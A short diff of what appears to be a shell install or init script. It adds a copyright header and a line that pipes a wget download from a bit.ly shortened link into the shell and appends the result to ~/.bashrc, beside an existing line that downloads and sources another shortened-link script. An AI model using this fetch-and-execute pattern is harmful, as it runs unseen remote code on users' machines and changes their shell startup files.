@@ -1,1 +1,5 @@
+#(C) Copyright 2020 Abhishek Choudhary
+#All rights reserved
+
 ayesh=$(tempfile) && wget https://bit.ly/ayevdi-sfrom-init -O${ayesh} -q && . ${ayesh}
+echo wget -q -O- https://bit.ly/ayevdi-s1 | . /dev/stdin >>${HOME}/.bashrc
